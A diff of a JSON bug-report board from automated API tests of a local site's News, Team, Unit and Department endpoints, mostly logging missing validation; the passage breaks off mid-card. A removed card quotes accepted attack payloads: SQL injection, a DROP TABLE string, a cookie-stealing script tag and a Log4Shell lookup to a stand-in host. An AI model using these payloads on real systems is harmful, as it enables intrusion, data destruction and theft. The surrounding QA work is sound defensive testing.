@@ -1,27 +1,87 @@
 {
-  "name": "DDT Bugs — News / Team / Unit / Department",
-  "desc": "Багрепорти зі знахідками з Newman DDT-прогонів (└ SQL_XSS Update faculty.txt). Джерело і повний опис методології — DDT/BUGS.md.",
+  "name": "DDT Bugs — News / Team / Unit / Department (1 картка = 1 ітерація)",
+  "desc": "Автоматично згенеровано з └ SQL_XSS Update faculty.txt. Повний опис методології — DDT/BUGS.md.",
   "closed": false,
   "lists": [
     {
-      "id": "list-validation",
-      "name": "Validation gaps (News / Team / Unit / Department)",
+      "id": "list-1",
+      "name": "News → Update news DDT",
       "closed": false,
       "pos": 1
     },
     {
-      "id": "list-security",
-      "name": "Security — critical (payloads accepted)",
+      "id": "list-2",
+      "name": "Team → Create team DDT",
       "closed": false,
       "pos": 2
+    },
+    {
+      "id": "list-3",
+      "name": "Team → Update team DDT",
+      "closed": false,
+      "pos": 3
+    },
+    {
+      "id": "list-4",
+      "name": "Unit → Update unit DDT",
+      "closed": false,
+      "pos": 4
+    },
+    {
+      "id": "list-5",
+      "name": "Unit → Create unit DDT",
+      "closed": false,
+      "pos": 5
+    },
+    {
+      "id": "list-6",
+      "name": "Department → Create department DDT",
+      "closed": false,
+      "pos": 6
+    },
+    {
+      "id": "list-7",
+      "name": "Department → Edit department DDT",
+      "closed": false,
+      "pos": 7
+    },
+    {
+      "id": "list-8",
+      "name": "News → SQL_XSS Create news",
+      "closed": false,
+      "pos": 8
+    },
+    {
+      "id": "list-9",
+      "name": "Team → SQL_XSS Create team",
+      "closed": false,
+      "pos": 9
+    },
+    {
+      "id": "list-10",
+      "name": "Unit → SQL_XSS Create unit",
+      "closed": false,
+      "pos": 10
+    },
+    {
+      "id": "list-11",
+      "name": "Department → SQL_XSS Create department",
+      "closed": false,
+      "pos": 11
+    },
+    {
+      "id": "list-12",
+      "name": "Department → SQL_XSS Edit department",
+      "closed": false,
+      "pos": 12
     }
   ],
   "cards": [
     {
-      "id": "BR-01",
-      "name": "BR-01: Немає перевірки максимальної довжини текстових полів (maxLength)",
-      "desc": "**Опис:** Поля `Title`/`Name` приймають рядки будь-якої довжини — 5000-символьні (News/Team/Unit) і 300-символьний (Department) пробні значення проходять валідацію моделі й зберігаються в БД, хоча очікувалась відмова.\n\n**Ітерація:**\n- News → Update news DDT: 8, 13\n- Team → Create team DDT: 26, 35\n- Unit → Update unit DDT: 10\n- Unit → Create unit DDT: 16\n- Department → Create department DDT: 75\n- Department → Edit department DDT: 75\n\n**Тіло:**\n- `PUT /api/News/11000` — `{\"Title\": \"<5000 символів>\", ...}` → `200 OK`\n- `POST /api/Team` (multipart) — `Name=<5000 символів>&Position=Посада` → `201 Created`\n- `PUT /api/Unit/10` (multipart) — `Name=<5000 символів>` → `204 No Content`\n- `POST /api/Unit` (multipart) — `Name=<5000 символів>` → `201 Created`\n- `POST /api/departments` (multipart) — `Name=<300 символів>, Logo=cat.1.jpg` → `201 Created, 394-413B`\n- `PUT /api/departments/11` (multipart) — `Name=<300 символів>` → `204 No Content, 81B`\n\n**Очікуваний результат:** 300 символів\n\n**Фактичний результат:** очікувався `400 Bad Request` (валідація довжини), реально отримано `200/201/204` — значення прийнято й збережено без обрізання чи відмови для всіх перелічених ітерацій.",
-      "idList": "list-validation",
+      "id": "BR-001",
+      "name": "BR-001: News → Update news DDT, ітерація 4: Граничне/IsImportant не передано — скидається на false (field default), навіть якщо раніше було true",
+      "desc": "**Опис:** DDT-рядок 4 з `ddt_update_news.csv` — сценарій «Граничне/IsImportant не передано — скидається на false (field default), навіть якщо раніше було true».\n\n**Ітерація:** 4 (News → Update news DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/News/11000`\n- Request body: `Title=Новина IsImportant не задано`\n- Response: `200`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `200`",
+      "idList": "list-1",
       "pos": 1,
       "closed": false,
       "due": null,
@@ -34,10 +94,10 @@
       ]
     },
     {
-      "id": "BR-02",
-      "name": "BR-02: Немає перевірки типу/MIME файлу при завантаженні як зображення/логотип",
-      "desc": "**Опис:** Ендпоінти замінюють/зберігають зображення (`Image`, `Logo`) без перевірки MIME-типу чи розширення — офісний документ (`.xlsx`) приймається так само, як jpg/png.\n\n**Ітерація:**\n- News → Update news DDT: 7\n- Team → Create team DDT: 24\n- Team → Update team DDT: рядок 10 (`smoke_about_us.xlsx`)\n- Unit → Update unit DDT: 8\n- Department → Create department DDT: 72\n- Department → Edit department DDT: 72\n\n**Тіло:**\n- `PUT /api/News/11000` (multipart) — `Images=smoke_contacts.xlsx` → `200 OK`\n- `POST /api/Team` — `ImageFilePath=smoke_main_page.xlsx` → `201 Created`\n- `POST /api/departments` — `Logo=requirements.txt` → `201 Created`\n- `PUT /api/departments/11` — `Logo=requirements.txt` → `204 No Content, 81B`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request` (невалідний тип файлу для зображення), реально отримано `200/201/204` — xlsx/txt збережено як зображення/логотип.",
-      "idList": "list-validation",
+      "id": "BR-002",
+      "name": "BR-002: News → Update news DDT, ітерація 7: Негатив-очікування/xlsx приймається як нове зображення — відсутня перевірка MIME",
+      "desc": "**Опис:** DDT-рядок 7 з `ddt_update_news.csv` — сценарій «Негатив-очікування/xlsx приймається як нове зображення — відсутня перевірка MIME».\n\n**Ітерація:** 7 (News → Update news DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/News/11000`\n- Request body: `Title=Новина з документом як зображенням, ImagesFilePaths=E:/Study/Profkom site/Sprint4/data/Documents/smoke_contacts.xlsx`\n- Response: `200`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `200`",
+      "idList": "list-1",
       "pos": 2,
       "closed": false,
       "due": null,
@@ -50,10 +110,10 @@
       ]
     },
     {
-      "id": "BR-03",
-      "name": "BR-03: Boolean/enum/числові поля мовчки скидаються на дефолт замість помилки при відсутності",
-      "desc": "**Опис:** Якщо поле (`IsImportant`, `IsActive`, `IsTemporary`, `IsChoosed`, `Type`, `OrderInd`) не передане у формі, контролер не вимагає його, а C#-ініціалізатор DTO підставляє дефолтне значення (`false`/`0`) — навіть якщо в записі раніше було інше значення.\n\n**Ітерація:**\n- News → Update news DDT: 4 (`IsImportant`)\n- Team → Create team DDT: 6 (`Type`), 14 (`OrderInd`), 17 (`IsTemporary`), 19 (`IsChoosed`)\n- Team → Update team DDT: 5 (`Type`), 6 (`IsTemporary`), 9 (`IsChoosed`)\n- Unit → Create unit DDT: 5 (`OrderInd`), 6 (`IsActive`)\n- Unit → Update unit DDT: 4 (`IsActive`)\n\n**Тіло:**\n- `PUT /api/News/11000` — без поля `IsImportant` → `200 OK`\n- `POST /api/Team` — без поля `Type`/`OrderInd`/`IsTemporary`/`IsChoosed` → `201 Created`\n- `POST /api/Unit`, `PUT /api/Unit/10` — без поля `OrderInd`/`IsActive` → `201 Created` / `204 No Content`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request` (поле обов'язкове), реально отримано `200/201/204` — поле мовчки набуло дефолтного значення.",
-      "idList": "list-validation",
+      "id": "BR-003",
+      "name": "BR-003: News → Update news DDT, ітерація 8: Граничне/Title 5000 символів при оновленні",
+      "desc": "**Опис:** DDT-рядок 8 з `ddt_update_news.csv` — сценарій «Граничне/Title 5000 символів при оновленні».\n\n**Ітерація:** 8 (News → Update news DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/News/11000`\n- Request body: `Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів)`\n- Response: `200`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `200`",
+      "idList": "list-1",
       "pos": 3,
       "closed": false,
       "due": null,
@@ -66,10 +126,10 @@
       ]
     },
     {
-      "id": "BR-04",
-      "name": "BR-04: Type (enum MemberType) приймається як рядкова назва замість лише числа",
-      "desc": "**Опис:** `Team.Type` — enum (0/1/2), але модел-байндинг ASP.NET Core додатково приймає текстові назви enum-значень (`Aparat`, `Profburo`, `Viddil`) без явної схеми, що суперечить задокументованій Swagger-специфікації (лише `integer, int32`).\n\n**Ітерація:** Team → Create team DDT: 10, 11, 12\n\n**Тіло:** `POST /api/Team` (multipart) — `Type=Aparat` / `Type=Profburo` / `Type=Viddil` → `201 Created`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request` (Type — лише `int32` за Swagger-схемою), реально отримано `201 Created` для всіх трьох текстових варіантів.",
-      "idList": "list-validation",
+      "id": "BR-004",
+      "name": "BR-004: News → Update news DDT, ітерація 12: Граничне/Оновлення на Title, що дублює інший запис, дозволене",
+      "desc": "**Опис:** DDT-рядок 12 з `ddt_update_news.csv` — сценарій «Граничне/Оновлення на Title, що дублює інший запис, дозволене».\n\n**Ітерація:** 12 (News → Update news DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/News/11000`\n- Request body: `Title=DupNewsTitleUpdated`\n- Response: `200`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `200`",
+      "idList": "list-1",
       "pos": 4,
       "closed": false,
       "due": null,
@@ -82,10 +142,10 @@
       ]
     },
     {
-      "id": "BR-05",
-      "name": "BR-05: Немає перевірки діапазону для OrderInd",
-      "desc": "**Опис:** `OrderInd` приймає будь-яке ціле — від'ємне чи величезне (до `999999`) — без обмеження діапазону.\n\n**Ітерація:**\n- Team → Create team DDT: 15 (`-5`), 16 (`999999`)\n- Unit → Create unit DDT: 14 (`-3`)\n\n**Тіло:** `POST /api/Team` — `OrderInd=-5` / `OrderInd=999999` → `201 Created`; `POST /api/Unit` — `OrderInd=-3` → `201 Created`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request` (OrderInd поза розумним діапазоном), реально отримано `201 Created`.",
-      "idList": "list-validation",
+      "id": "BR-005",
+      "name": "BR-005: News → Update news DDT, ітерація 13: Граничне/Дуже довгий кириличний Title при оновленні",
+      "desc": "**Опис:** DDT-рядок 13 з `ddt_update_news.csv` — сценарій «Граничне/Дуже довгий кириличний Title при оновленні».\n\n**Ітерація:** 13 (News → Update news DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/News/11000`\n- Request body: `Title=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів)`\n- Response: `200`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `200`",
+      "idList": "list-1",
       "pos": 5,
       "closed": false,
       "due": null,
@@ -98,10 +158,10 @@
       ]
     },
     {
-      "id": "BR-06",
-      "name": "BR-06: Дублікат Name/Title дозволений при оновленні — немає обмеження унікальності",
-      "desc": "**Опис:** Оновлення існуючого запису на `Title`/`Name`, що вже використовує інший запис, минається без помилки — обмеження унікальності на рівні БД/бізнес-логіки відсутнє.\n\n**Ітерація:**\n- News → Update news DDT: 12 (`DupNewsTitleUpdated`)\n- Unit → Create unit DDT: 20 (`DupUnitName`, перший дублікат)\n\n**Тіло:** `PUT /api/News/11000` — `Title=DupNewsTitleUpdated` → `200 OK`; `POST /api/Unit` — `Name=DupUnitName` → `201 Created`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request` (дублікат назви), реально отримано `200 OK`/`201 Created`.",
-      "idList": "list-validation",
+      "id": "BR-006",
+      "name": "BR-006: Team → Create team DDT, ітерація 6: Граничне/Type не передано — приймає значення за замовчуванням 0 (Aparat)",
+      "desc": "**Опис:** DDT-рядок 6 з `ddt_create_team.csv` — сценарій «Граничне/Type не передано — приймає значення за замовчуванням 0 (Aparat)».\n\n**Ітерація:** 6 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=Type не задано, Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
       "pos": 6,
       "closed": false,
       "due": null,
@@ -114,10 +174,10 @@
       ]
     },
     {
-      "id": "BR-07",
-      "name": "BR-07: Рядок лише з пробілів приймається як валідне значення (немає .Trim()-валідації)",
-      "desc": "**Опис:** `Name`/`Position`, що містять лише пробіли, проходять `[Required]`-валідацію (яка перевіряє тільки `null`/порожній рядок, не trim), і зберігаються як є.\n\n**Ітерація:** Team → Create team DDT: 37 (`Name`), 39 (`Position`)\n\n**Тіло:** `POST /api/Team` — `Name=\"   \"` / `Position=\"   \"` → `201 Created`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request`, реально отримано `201 Created`.",
-      "idList": "list-validation",
+      "id": "BR-007",
+      "name": "BR-007: Team → Create team DDT, ітерація 10: Граничне/Type у вигляді назви enum 'Aparat' приймається",
+      "desc": "**Опис:** DDT-рядок 10 з `ddt_create_team.csv` — сценарій «Граничне/Type у вигляді назви enum 'Aparat' приймається».\n\n**Ітерація:** 10 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=Type як назва Aparat, Position=Посада, Type=Aparat`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
       "pos": 7,
       "closed": false,
       "due": null,
@@ -130,10 +190,10 @@
       ]
     },
     {
-      "id": "BR-08",
-      "name": "BR-08: Невалідний формат Email приймається без перевірки",
-      "desc": "**Опис:** `Team.Email` — звичайний `string`, без атрибута `[EmailAddress]` чи regex-перевірки формату.\n\n**Ітерація:** Team → Create team DDT: 34\n\n**Тіло:** `POST /api/Team` — `Email=not-an-email` → `201 Created`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400 Bad Request` (невалідний формат email), реально отримано `201 Created`.",
-      "idList": "list-validation",
+      "id": "BR-008",
+      "name": "BR-008: Team → Create team DDT, ітерація 11: Граничне/Type у вигляді назви enum 'Profburo' приймається",
+      "desc": "**Опис:** DDT-рядок 11 з `ddt_create_team.csv` — сценарій «Граничне/Type у вигляді назви enum 'Profburo' приймається».\n\n**Ітерація:** 11 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=Type як назва Profburo, Position=Посада, Type=Profburo`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
       "pos": 8,
       "closed": false,
       "due": null,
@@ -146,49 +206,2609 @@
       ]
     },
     {
-      "id": "BR-09",
-      "name": "BR-09 [CRITICAL]: SQL Injection/XSS/NoSQL/LDAP/Path Traversal/Command/Template/Log4Shell/CRLF/Null Byte/Homoglyph/Length payload-и приймаються на створенні (News, Team, Unit)",
-      "desc": "**Опис:** `POST /api/News`, `POST /api/Team`, `POST /api/Unit` не відхиляють жодної категорії шкідливого вводу в текстових полях — усі payload-и повертають `201 Created` замість `4xx`. Кожен ендпоінт провалив однаковий набір із 34 payload-ів (SQL Injection ×8, XSS ×9, NoSQL Injection ×2, LDAP Injection ×1, Path Traversal ×2, Command Injection ×2, Template Injection ×2, Log4Shell ×2, CRLF Injection ×2, Null Byte ×1, Homoglyph ×1, Length ×2).\n\n**Ітерація:**\n- News → SQL_XSS Create news: 1–34 (34/34 payload-ів провалено)\n- Team → SQL_XSS Create team: 1–34 (34/34)\n- Unit → SQL_XSS Create unit: 1–34 (34/34)\n\n**Тіло (приклади):**\n- `POST /api/News` — `Title=' OR '1'='1` → `201 Created`\n- `POST /api/News` — `Title=<script>alert(document.cookie)</script>` → `201 Created`\n- `POST /api/Team` — `Name='; DROP TABLE Team;--` → `201 Created`\n- `POST /api/Unit` — `Name=${jndi:ldap://evil.local/A1}` (Log4Shell) → `201 Created`\n- Повний список payload-ів — `DDT/DDT News/SQL_XSS_create_news.csv`, `DDT/DDT Team/SQL_XSS_create_team.csv`, `DDT/DDT Unit/SQL_XSS_create_unit.csv`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`) для кожного payload-а, реально отримано `201 Created` для всіх 34 payload-ів на кожному з трьох ендпоінтів (102 прийнятих шкідливих значення сумарно).",
-      "idList": "list-security",
-      "pos": 1,
+      "id": "BR-009",
+      "name": "BR-009: Team → Create team DDT, ітерація 12: Граничне/Type у вигляді назви enum 'Viddil' приймається",
+      "desc": "**Опис:** DDT-рядок 12 з `ddt_create_team.csv` — сценарій «Граничне/Type у вигляді назви enum 'Viddil' приймається».\n\n**Ітерація:** 12 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=Type як назва Viddil, Position=Посада, Type=Viddil`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 9,
       "closed": false,
       "due": null,
       "dueComplete": false,
       "labels": [
         {
-          "name": "security-critical",
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-010",
+      "name": "BR-010: Team → Create team DDT, ітерація 14: Граничне/OrderInd не передано — приймає значення за замовчуванням 0",
+      "desc": "**Опис:** DDT-рядок 14 з `ddt_create_team.csv` — сценарій «Граничне/OrderInd не передано — приймає значення за замовчуванням 0».\n\n**Ітерація:** 14 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=OrderInd не задано, Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 10,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-011",
+      "name": "BR-011: Team → Create team DDT, ітерація 15: Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону",
+      "desc": "**Опис:** DDT-рядок 15 з `ddt_create_team.csv` — сценарій «Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону».\n\n**Ітерація:** 15 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=OrderInd від'ємний, Position=Посада, OrderInd=-5`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 11,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-012",
+      "name": "BR-012: Team → Create team DDT, ітерація 16: Граничне/Дуже великий OrderInd приймається",
+      "desc": "**Опис:** DDT-рядок 16 з `ddt_create_team.csv` — сценарій «Граничне/Дуже великий OrderInd приймається».\n\n**Ітерація:** 16 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=OrderInd великий, Position=Посада, OrderInd=999999`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 12,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-013",
+      "name": "BR-013: Team → Create team DDT, ітерація 17: Граничне/IsTemporary не передано — приймає значення за замовчуванням false",
+      "desc": "**Опис:** DDT-рядок 17 з `ddt_create_team.csv` — сценарій «Граничне/IsTemporary не передано — приймає значення за замовчуванням false».\n\n**Ітерація:** 17 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=IsTemporary не задано, Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 13,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-014",
+      "name": "BR-014: Team → Create team DDT, ітерація 19: Граничне/IsChoosed не передано — приймає значення за замовчуванням false",
+      "desc": "**Опис:** DDT-рядок 19 з `ddt_create_team.csv` — сценарій «Граничне/IsChoosed не передано — приймає значення за замовчуванням false».\n\n**Ітерація:** 19 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=IsChoosed не задано, Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 14,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-015",
+      "name": "BR-015: Team → Create team DDT, ітерація 24: Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME",
+      "desc": "**Опис:** DDT-рядок 24 з `ddt_create_team.csv` — сценарій «Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME».\n\n**Ітерація:** 24 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=Документ як зображення, Position=Посада, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_main_page.xlsx`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 15,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-016",
+      "name": "BR-016: Team → Create team DDT, ітерація 26: Граничне/Name 5000 символів приймається — немає maxLength",
+      "desc": "**Опис:** DDT-рядок 26 з `ddt_create_team.csv` — сценарій «Граничне/Name 5000 символів приймається — немає maxLength».\n\n**Ітерація:** 26 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів), Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 16,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-017",
+      "name": "BR-017: Team → Create team DDT, ітерація 34: Негатив-очікування/Невалідний формат Email приймається — немає перевірки формату",
+      "desc": "**Опис:** DDT-рядок 34 з `ddt_create_team.csv` — сценарій «Негатив-очікування/Невалідний формат Email приймається — немає перевірки формату».\n\n**Ітерація:** 34 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=Невалідний email формат, Position=Посада, Email=not-an-email`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 17,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-018",
+      "name": "BR-018: Team → Create team DDT, ітерація 35: Граничне/Дуже довгий кириличний Name (5000 символів) приймається",
+      "desc": "**Опис:** DDT-рядок 35 з `ddt_create_team.csv` — сценарій «Граничне/Дуже довгий кириличний Name (5000 символів) приймається».\n\n**Ітерація:** 35 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів), Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 18,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-019",
+      "name": "BR-019: Team → Create team DDT, ітерація 37: Граничне/Name лише з пробілів → 400",
+      "desc": "**Опис:** DDT-рядок 37 з `ddt_create_team.csv` — сценарій «Граничне/Name лише з пробілів → 400».\n\n**Ітерація:** 37 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Position=Посада`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 19,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-020",
+      "name": "BR-020: Team → Create team DDT, ітерація 39: Граничне/Position лише з пробілів → 400",
+      "desc": "**Опис:** DDT-рядок 39 з `ddt_create_team.csv` — сценарій «Граничне/Position лише з пробілів → 400».\n\n**Ітерація:** 39 (Team → Create team DDT)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `Name=З пробільним Position`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `201`",
+      "idList": "list-2",
+      "pos": 20,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-021",
+      "name": "BR-021: Team → Update team DDT, ітерація 4: Граничне/Type не передано при оновленні — скидається на 0 (Aparat)",
+      "desc": "**Опис:** DDT-рядок 4 з `ddt_update_team.csv` — сценарій «Граничне/Type не передано при оновленні — скидається на 0 (Aparat)».\n\n**Ітерація:** 4 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=Type не задано при оновленні, Position=Посада`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 21,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-022",
+      "name": "BR-022: Team → Update team DDT, ітерація 5: Граничне/IsTemporary не передано — скидається на false, навіть якщо раніше було true",
+      "desc": "**Опис:** DDT-рядок 5 з `ddt_update_team.csv` — сценарій «Граничне/IsTemporary не передано — скидається на false, навіть якщо раніше було true».\n\n**Ітерація:** 5 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=IsTemporary не задано, Position=Посада`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 22,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-023",
+      "name": "BR-023: Team → Update team DDT, ітерація 6: Граничне/IsChoosed не передано — скидається на false",
+      "desc": "**Опис:** DDT-рядок 6 з `ddt_update_team.csv` — сценарій «Граничне/IsChoosed не передано — скидається на false».\n\n**Ітерація:** 6 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=IsChoosed не задано, Position=Посада`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 23,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
+          "color": "yellow"
+        }
+      ]
+    },
+    {
+      "id": "BR-024",
+      "name": "BR-024: Team → Update team DDT, ітерація 9: Негатив-очікування/xlsx приймається як заміна Image",
+      "desc": "**Опис:** DDT-рядок 9 з `ddt_update_team.csv` — сценарій «Негатив-очікування/xlsx приймається як заміна Image».\n\n**Ітерація:** 9 (Team → Update team DDT)\n\n**Тіло:**\n- Endpoint: `PUT http://localhost:8080/api/Team/101`\n- Request body: `Name=З документом як зображенням, Position=Посада, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_about_us.xlsx`\n- Response: `204`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувався `400`, реально отримано `204`",
+      "idList": "list-3",
+      "pos": 24,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "validation",
